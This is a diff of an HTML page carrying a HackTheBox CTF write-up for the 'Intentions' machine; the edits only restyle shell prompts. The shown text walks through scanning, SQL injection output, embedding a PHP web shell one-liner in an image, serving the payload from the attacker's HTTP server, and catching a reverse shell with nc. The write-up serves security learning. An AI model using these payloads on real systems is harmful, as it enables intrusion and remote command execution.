@@ -31,10 +31,10 @@
                 </ul>
             </div>
             <div class="writeup-content-main">
-                <div class="highlight"><pre><span></span><span class="n">Machine</span><span class="p">:</span> <span class="n">Intentions</span>
-<span class="n">Difficult</span><span class="p">:</span> <span class="n">Hard</span>
-<span class="n">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
-<span class="n">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">07</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">2023</span>
+                <div class="highlight"><pre><span></span><span class="k">Machine</span><span class="p">:</span> <span class="n">Intentions</span>
+<span class="k">Difficulty</span><span class="p">:</span> <span class="n">Hard</span>
+<span class="k">Platform</span><span class="p">:</span> <span class="n">HackTheBox</span>
+<span class="k">Release</span><span class="p">:</span> <span class="n">Released</span> <span class="n">on</span> <span class="mi">07</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">2023</span>
 </pre></div>
 <h3><br/>About Intentions</h3><br/>
 Intentions is a hard-level machine from the HackTheBox platform. Initially, we discovered a SQL injection vulnerability that allowed us to obtain hashes of administrator users. We also came across valuable information about a purported version 2 of the API, which enabled us to use these hashes as credentials.<br/><br/>
@@ -46,7 +46,7 @@ By listing the contents of the directory where the website is hosted, we discove
 Finally, as the 'greg' user, we can execute a binary that will enable us to read system files without regard to our privileges, utilizing a clever exploitation and exploiting a capability. We've developed a Python script to automate a brute force process.<br/><br/>
 <h3><br>Recon</br></h3><br>
 As always, we'll kick off with a port scan to uncover open ports. Keep in mind that these ports expose various services on the machine. For this task, we'll employ Nmap:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.220</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">p</span><span class="o">-</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="n">sS</span> <span class="o">--</span><span class="nb">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">10000</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.11.220</span> <span class="o">-</span><span class="n">oN</span> <span class="n">portScan</span>
 
 <span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span>
 <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>
@@ -55,7 +55,7 @@ As always, we'll kick off with a port scan to uncover open ports. Keep in mind t
 
 At first glance, we observe that ports 80 and 22 are accessible. The subsequent step entails conducting a comprehensive scan to identify the technologies and services operating over these ports.<br/><br/>
 Once again, we'll employ Nmap to execute this scan:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.220</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span> <span class="mf">10.10.11.220</span> <span class="o">-</span><span class="n">oN</span> <span class="n">fullScan</span>
 
 <span class="n">PORT</span>   <span class="n">STATE</span> <span class="n">SERVICE</span> <span class="n">VERSION</span>
 <span class="mi">22</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssh</span>     <span class="n">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.1</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
@@ -71,7 +71,7 @@ Once again, we'll employ Nmap to execute this scan:<br/><br/>
 Based on the earlier findings, we can now ascertain that port 80 is associated with the HTTP service (Web Application Service), while port 22 corresponds to the SSH service.<br/><br/>
 <h3><br>Web Application</br></h3><br>
 Before accessing the website through our web browser, we can use <code>whatweb</code> to attempt to uncover the technologies, versions, and other details of the website.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.220</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">whatweb</span> <span class="o">-</span><span class="n">a</span> <span class="mi">3</span> <span class="mf">10.10.11.220</span>
 <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span> <span class="p">[</span><span class="mi">200</span> <span class="n">OK</span><span class="p">]</span> <span class="n">Cookies</span><span class="p">[</span><span class="n">XSRF</span><span class="o">-</span><span class="n">TOKEN</span><span class="p">,</span><span class="n">intentions_session</span><span class="p">],</span> <span class="n">Country</span><span class="p">[</span><span class="n">RESERVED</span><span class="p">][</span><span class="n">ZZ</span><span class="p">],</span> <span class="n">HTML5</span><span class="p">,</span> <span class="n">HTTPServer</span><span class="p">[</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">][</span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)],</span> <span class="n">HttpOnly</span><span class="p">[</span><span class="n">intentions_session</span><span class="p">],</span> <span class="n">IP</span><span class="p">[</span><span class="mf">10.10.11.220</span><span class="p">],</span> <span class="n">Script</span><span class="p">,</span> <span class="n">Title</span><span class="p">[</span><span class="n">Intentions</span><span class="p">],</span> <span class="n">UncommonHeaders</span><span class="p">[</span><span class="n">x</span><span class="o">-</span><span class="n">content</span><span class="o">-</span><span class="nb">type</span><span class="o">-</span><span class="n">options</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">Frame</span><span class="o">-</span><span class="n">Options</span><span class="p">[</span><span class="n">SAMEORIGIN</span><span class="p">],</span> <span class="n">X</span><span class="o">-</span><span class="n">XSS</span><span class="o">-</span><span class="n">Protection</span><span class="p">[</span><span class="mi">1</span><span class="p">;</span> <span class="n">mode</span><span class="o">=</span><span class="n">block</span><span class="p">],</span> <span class="n">nginx</span><span class="p">[</span><span class="mf">1.18.0</span><span class="p">]</span>
 </pre></div>
 
@@ -206,7 +206,7 @@ I'm going to create a Python script to automate this process<br/><br/>
 </pre></div>
 
 Let's proceed to execute the script:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
 <span class="n">SQLI</span> <span class="o">&gt;</span> <span class="ow">or</span> <span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
 <span class="p">{</span>
     <span class="s2">"status"</span><span class="p">:</span> <span class="s2">"success"</span><span class="p">,</span>
@@ -685,7 +685,7 @@ There are two admin users. I've observed that the passwords are stored in an enc
 Nonetheless, I've saved the hashes in a file for future reference.<br/><br/>
 <h3><br>API v2</br></h3><br>
 Our next step involves launching a fuzzing attack to uncover new directories and files on the website. For this purpose, I'll be utilizing the <a href="https://github.com/ffuf/ffuf">ffuf</a> tool to execute the attack.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">FUZZ</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">FUZZ</span>
 
         <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
        <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
@@ -737,7 +737,7 @@ Our next step involves launching a fuzzing attack to uncover new directories and
 
 I've discovered a section labeled <code>admin</code>, but it appears inaccessible. To gain access, I'll need to log in as an administrator.<br/><br/>
 Now, I'm going to conduct a fuzzing operation on the <code>js</code> directory, as there's a possibility we may come across some intriguing JavaScript scripts.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">js</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">ffuf</span> <span class="o">-</span><span class="n">c</span> <span class="o">--</span><span class="n">fc</span><span class="o">=</span><span class="mi">404</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">small</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">FUZZ</span><span class="o">.</span><span class="n">js</span>
 
         <span class="o">/</span><span class="s1">'___\  /'</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">'___\       </span>
        <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span> <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>  <span class="n">__</span>  <span class="n">__</span>  <span class="o">/</span>\ \<span class="n">__</span><span class="o">/</span>       
@@ -782,7 +782,7 @@ Now, I'm going to conduct a fuzzing operation on the <code>js</code> directory, 
 </pre></div>
 
 Among these files, the most prominent one is <code>admin.js</code>. I will proceed to read its content: <br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">js</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.220</span><span class="o">/</span><span class="n">js</span><span class="o">/</span><span class="n">admin</span><span class="o">.</span><span class="n">js</span>
 </pre></div>
 
 The file is quite extensive, but towards the end, I've come across some intriguing messages:<br/><br/>
@@ -839,7 +839,7 @@ But it returns an error:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/39.png"/><br/><br/>
 Instead of specifying a system file, I will use a URL to an HTTP server hosted on my machine:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/40.png"/><br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
 <span class="mf">10.10.11.220</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">14</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">09</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
 </pre></div>
@@ -851,7 +851,7 @@ Following some research online, I came across an article on <a href="https://boo
 We can attempt to abuse this vulnerability by leveraging the <code>Vid Parser</code>, which allows us to write arbitrary content to an arbitrary path within the filesystem. This could be used to write a PHP webshell and potentially gain RCE.<br/><br/>
 For a more in-depth exploration of this exploitation, I recommend reading the article on <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">PT Security</a>.<br/><br/>
 To begin, we need to create an image containing a PHP web shell, as MSL only accepts images.<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">convert</span> <span class="n">xc</span><span class="p">:</span><span class="n">red</span> <span class="o">-</span><span class="nb">set</span> <span class="s1">'Copyright'</span> <span class="s1">'&lt;?php echo shell_exec($_REQUEST["cmd"]); ?&gt;'</span> <span class="n">positive</span><span class="o">.</span><span class="n">png</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">convert</span> <span class="n">xc</span><span class="p">:</span><span class="n">red</span> <span class="o">-</span><span class="nb">set</span> <span class="s1">'Copyright'</span> <span class="s1">'&lt;?php echo shell_exec($_REQUEST["cmd"]); ?&gt;'</span> <span class="n">positive</span><span class="o">.</span><span class="n">png</span>
 <span class="n">elswixqkali</span><span class="err">$</span>
 </pre></div>
 
@@ -864,7 +864,7 @@ Next, we will generate an MSL file that will facilitate the transfer of this ima
 </pre></div>
 
 First, I need to have an HTTP server actively listening on port 80:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
 </pre></div>
 
@@ -877,7 +877,7 @@ Great, we can now access our web shell at <code>/pwned.php</code>.:<br/><br/>
 Finally, we've successfully achieved Remote Code Execution (RCE):<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/44.png"/><br/><br/>
 Now, we're going to initiate a reverse shell, so make sure you have <code>nc</code> (netcat) listening:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
@@ -886,36 +886,36 @@ Now, we're going to initiate a reverse shell, so make sure you have <code>nc</co
 Next, we'll send the reverse shell with URL encoding for the <code>&amp;</code> character:<br/><br/>
 <img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/45.png"/><br/><br/>
 Finally, we have successfully gained access to the system:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.220</span><span class="p">:</span><span class="mf">50784.</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">1070</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
 <span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
-<span class="o">@</span><span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span>
+<span class="o">@</span><span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span>
 </pre></div>
 
 We have successfully accessed the system, now we will simply adjust the TTY to interact more comfortably with the system:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
 <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
 <span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
-<span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
+<span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
 <span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 
-<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
 <span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
                                <span class="n">reset</span>
 <span class="n">reset</span><span class="p">:</span> <span class="n">unknown</span> <span class="n">terminal</span> <span class="nb">type</span> <span class="n">unknown</span>
 <span class="n">Terminal</span> <span class="nb">type</span><span class="err">?</span> <span class="n">xterm</span>
 </pre></div>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
-<span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
-<span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="o">/</span><span class="n">public</span><span class="err">$</span>
 </pre></div>
 <h3><br>Shell as greg</br></h3><br>
 While exploring the web directories, I discovered the presence of a <code>.git</code> file, indicating that the web application is a Git repository:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="err">$</span>  <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
+<div class="highlight"><pre><span></span><span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="err">$</span>  <span class="n">ls</span> <span class="o">-</span><span class="n">la</span>
 <span class="n">total</span> <span class="mi">820</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">14</span> <span class="n">root</span>     <span class="n">root</span>       <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">2</span>  <span class="mi">2023</span> <span class="o">.</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span>     <span class="n">root</span>       <span class="mi">4096</span> <span class="n">Feb</span>  <span class="mi">2</span>  <span class="mi">2023</span> <span class="o">..</span>
@@ -942,11 +942,11 @@ While exploring the web directories, I discovered the presence of a <code>.git</
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">4</span> <span class="n">root</span>     <span class="n">root</span>       <span class="mi">4096</span> <span class="n">Apr</span> <span class="mi">12</span>  <span class="mi">2022</span> <span class="n">tests</span>
 <span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>  <span class="mi">45</span> <span class="n">root</span>     <span class="n">root</span>       <span class="mi">4096</span> <span class="n">Jan</span> <span class="mi">29</span>  <span class="mi">2023</span> <span class="n">vendor</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="n">root</span>     <span class="n">root</span>        <span class="mi">722</span> <span class="n">Feb</span>  <span class="mi">2</span>  <span class="mi">2023</span> <span class="n">webpack</span><span class="o">.</span><span class="n">mix</span><span class="o">.</span><span class="n">js</span>
-<span class="nd">@www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="err">$</span>
+<span class="nd">www</span><span class="o">-</span><span class="n">data</span><span class="nd">@intentions</span><span class="p">:</span><span class="o">~/</span><span class="n">html</span><span class="o">/</span><span class="n">intentions</span><span class="err">$</span>
 </pre></div>
 
 I've downloaded the Git repository to my local machine, and now I'll proceed to inspect the commits:<br/><br/>
-<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">log</span>
+<div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">git</span> <span class="n">log</span>
 <span class="n">commit</span> <span class="mi">1</span><span class="n">f29dfde45c21be67bb2452b46d091888ed049c3</span> <span class="p">(</span><span class="n">HEAD</span> <span class="o">-&gt;</span> <span class="n">master</span><span class="p">)</span>
 <span class="n">Author</span><span class="p">:</span> <span class="n">steve</span> <span class="o">&lt;</span><span class="n">steve</span><span class="nd">@intentions</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
